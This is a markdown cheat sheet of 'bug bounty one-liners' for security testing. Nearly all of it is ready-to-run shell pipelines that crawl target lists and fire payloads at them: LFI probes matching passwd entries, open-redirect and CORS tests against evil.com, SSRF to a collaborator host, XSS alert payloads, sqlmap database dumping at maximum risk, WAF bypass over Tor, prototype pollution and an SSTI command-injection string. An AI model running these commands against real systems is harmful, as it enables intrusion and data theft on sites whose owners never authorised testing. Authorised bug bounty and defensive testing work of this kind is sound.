# Bug Bounty Onliners

## LFI - Local File Inclusion
```
cat <target-list> | (gau || hakrawler || waybackurls || katana) |  grep '=' |  dedupe | pd-httpx -silent -paths <lfi-wordlist> -threads 100 -random-agent -x GET,POST -status-code -follow-redirects -mc 200 -mr 'root:[x*]:0:0:'
```

## Open Redirect option 1
```
echo <target-list> | (gau || hakrawler || waybackurls || katana) | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I | grep 'http://evil.com' && echo -e '$host \033[0;31mVulnerable\n' ;done
```
## Open Redirect - option 2
```
cat <domain-list> | (gau || hakrawler || waybackurls || katana) | grep '=' | dedupe | qsreplace 'http://example.com' | pd-httpx -fr -title -match-string 'Example Domain'
```

## SSRF - Server Side Request Forgery
```
cat <targets-list> | grep '=' | qsreplace '<burpcollaborator_link>' >> tmp-ssrf.txt; pd-httpx -silent -l tmp-ssrf.txt -fr 
```

## XSS - Cross Site Scripting option 1
```
cat <domains-list> | (gau || hakrawler || waybackurls || katana) | grep -Ev '\.(jpeg|jpg|png|ico|gif|css|woff|svg)$' | uro | grep =  | qsreplace '<img src=x onerror=alert(1)>' | httpx -silent -nc -mc 200 -mr '<img src=x onerror=alert(1)>'    
```

## XSS - Cross Site Scripting option 2
```
cat <target-list> | (gau || hakrawler || waybackurls || katana) | httpx -silent | Gxss -c 100 -p Xss | grep 'URL' | cut -d ''' -f2 | sort -u | dalfox pipe
```

## XSS - Cross Site Scripting option 3
```
echo <domain> | (gau || hakrawler || waybackurls || katana) | grep '=' |qsreplace ''><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure '$host' | grep -qs '<script>alert(1)</script>' && echo '$host \033[0;31m' Vulnerable;done
```

## XSS - Cross Site Scripting option 4
```
cat <targets-list > | grep '=' | sed 's/=.*/=/' | sed 's/URL: //' | tee testxss.txt ; dalfox file testxss.txt -b yours.xss.ht
```

## XSS - Cross Site Scripting option 5
```
cat <domain-list> | awk '{print $3}'| httpx -silent | xargs -I@ sh -c 'python3 http://xsstrike.py -u @ --crawl'
```

## SQLi - SQL Injection
```
cat <domain-list> | (gau || hakrawler || katana || waybckurls) | grep '=' | dedupe | anew tmp-sqli.txt && sqlmap -m tmp-sqli.txt --batch --random-agent --level 5 --risk 3 --dbs &&
for i in $(cat tmp-sqli.txt); do ghauri -u '$i' --level 3 --dbs --current-db --batch --confirm; done
```

## SQLi - SQL Injection Bypass WAF using TOR
```
sqlmap -r <request-file> --time-sec=10 --tor --tor-type=SOCKS5 --check-tor --dbs --random-agent --tamper=space2comment
```

## CORS 
```
echo <target-url> | (gau || hakrawler || waybackurls || katana) | while read url;do target=$(curl -s -I -H 'Origin: https://evil.com' -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on '$url';fi;done
```

## Prototype Pollution 
```
subfinder -d <domain> -all -silent | httpx -silent -threads 100 | anew alive.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' alive.txt | page-fetch -j 'window.testparam == 'exploit'? '[VULNERABLE]' : '[NOT VULNERABLE]'' | sed 's/(//g' | sed 's/)//g' | sed 's/JS //g' | grep 'VULNERABLE'
```

## SSTI - Server Side Template Injection option 1
```
for url in $(cat <target-list>); do python3 tplmap.py -u $url; print $url; done
```

## SSTI - Server Side Template Injection option 2 
```
echo <domain> | gau --subs --threads 200 | httpx -silent -mc 200 -nc | qsreplace “aaa%20%7C%7C%20id%3B%20x” > fuzzing.txt && ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080
```

## Get favicon hash
```
curl https://favicon-hash.kmsec.uk/api/?url=<url>/favicon.ico | jq
```